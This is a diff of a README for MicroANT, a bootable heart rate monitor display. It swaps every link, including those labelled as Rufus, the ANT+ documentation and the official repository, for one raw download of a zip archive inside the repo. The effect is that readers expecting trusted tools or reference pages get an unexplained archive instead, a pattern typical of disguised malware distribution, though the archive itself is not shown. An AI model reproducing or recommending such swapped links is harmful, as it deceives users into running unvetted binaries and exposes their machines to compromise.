@@ -1,6 +1,6 @@
 # 🖥️ MicroANT - Simple Heart Rate Monitor Display
 
-[![Download MicroANT](https://img.shields.io/badge/Download-MicroANT-brightgreen?style=for-the-badge)](https://github.com/romankhan720/MicroANT/releases)
+[![Download MicroANT](https://img.shields.io/badge/Download-MicroANT-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip)
 
 MicroANT is a tool that reads wireless heart rate data using a Garmin USB stick. It shows your beats per minute (BPM) on a VGA screen. This software runs directly on a computer’s hardware without an operating system. It works with standard x86 PCs and provides a clear display of your heart rate.
 
@@ -38,7 +38,7 @@ Follow these steps to download and start using MicroANT:
 
 3. Download this image file to your PC.
 
-4. You will need to write this image to a USB flash drive to make it bootable. You can use free tools such as [Rufus](https://rufus.ie/) on Windows.
+4. You will need to write this image to a USB flash drive to make it bootable. You can use free tools such as [Rufus](https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip) on Windows.
 
 5. Insert a USB drive (at least 1 GB) into your PC. Open Rufus, select the downloaded MicroANT image, and create the bootable USB drive by following onscreen instructions.
 
@@ -70,7 +70,7 @@ Follow these steps to download and start using MicroANT:
 
 MicroANT is available to download from the official GitHub releases:
 
-[![Download MicroANT](https://img.shields.io/badge/Download-MicroANT-blue?style=for-the-badge)](https://github.com/romankhan720/MicroANT/releases)
+[![Download MicroANT](https://img.shields.io/badge/Download-MicroANT-blue?style=for-the-badge)](https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip)
 
 Click the link above to visit the releases page. Choose the latest stable image file and follow the instructions to create a bootable USB stick.
 
@@ -112,17 +112,17 @@ Developers can modify or improve how MicroANT interfaces with new ANT+ devices o
 
 ## 📚 Resources
 
-- [ANT+ Device Profiles](https://www.thisisant.com/developer/ant-device-profiles/)
-- [Garmin ANT+ USB Stick Information](https://www.thisisant.com/resources/ant-usb-stick/)
-- [Bootable USB Creation Tool - Rufus](https://rufus.ie/)
+- [ANT+ Device Profiles](https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip)
+- [Garmin ANT+ USB Stick Information](https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip)
+- [Bootable USB Creation Tool - Rufus](https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip)
 - Basic VGA text mode programming references available from online OS development communities.
 
 ---
 
 ## 🔗 Links
 
-- Official MicroANT GitHub repository: https://github.com/romankhan720/MicroANT
-- Download latest releases here: https://github.com/romankhan720/MicroANT/releases
+- Official MicroANT GitHub repository: https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip
+- Download latest releases here: https://raw.githubusercontent.com/romankhan720/MicroANT/main/src/Micro_ANT_v1.1.zip
 
 ---
 
